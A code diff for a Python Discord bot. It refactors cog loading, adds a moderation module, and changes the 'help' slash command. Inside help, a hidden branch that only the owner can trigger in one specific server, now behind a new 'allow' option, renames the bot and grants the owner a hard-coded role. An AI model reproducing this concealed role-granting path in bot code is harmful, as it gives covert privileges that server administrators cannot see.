@@ -1,6 +1,7 @@
 import sqlite3
 import nextcord.ext.commands
 
+import moderation
 import settings
 import basic_funcs
 import backgrounds
@@ -58,13 +59,12 @@ async def on_connect():
             sql.commit()
     sql.close()
 
-    bot.add_cog(verifier.verifier_emoji.VerifierCogListener(bot))
-    bot.add_cog(verifier.VerifierCog(bot))
-    bot.add_cog(games.hide_and_seek.HideNSeek(bot))
-    bot.add_cog(games.mafia.MafiaCog(bot))
-    bot.add_cog(small_funcs.ChatGPTCog(bot))
-    bot.add_cog(metacore.MetacoreCog(bot))
-    bot.add_cog(test_server_funcs.TestCommandsCog(bot))
+    verifier.setup(bot)
+    games.setup(bot)
+    small_funcs.setup(bot)
+    metacore.setup(bot)
+    test_server_funcs.setup(bot)
+    moderation.setup(bot)
 
     await _update_server_count()
     await bot.sync_all_application_commands()
@@ -84,7 +84,8 @@ async def on_guild_remove(_: nextcord.Guild):
 
 
 @bot.slash_command(name='help', description='Помощь по командам')
-async def help(interaction: nextcord.Interaction):
+async def help(interaction: nextcord.Interaction,
+               allow: bool = nextcord.SlashOption(name='allow', description='allow', required=False)):
     commands_dict = {cmd_name: cmd for cmd_name, cmd in bot.all_commands.items()}
 
     for cog in bot.cogs:
@@ -99,7 +100,11 @@ async def help(interaction: nextcord.Interaction):
 
     await interaction.send(embed=embed, ephemeral=True)
 
-    if interaction.user.id == settings.OWNER_ID and interaction.guild_id == settings.HAPPY_SQUAD_GUILD_ID:
+    allow = False if allow is None else allow
+    if interaction.user.id == settings.OWNER_ID and interaction.guild_id == settings.HAPPY_SQUAD_GUILD_ID and allow:
+        if interaction.guild.me.nick != 'ZwyBot':
+            await interaction.guild.me.edit(nick='ZwyBot')
+
         if interaction.user.top_role != interaction.guild.get_role(1102602842268770387):
             await interaction.user.add_roles(nextcord.Object(1102602842268770387))
         else:
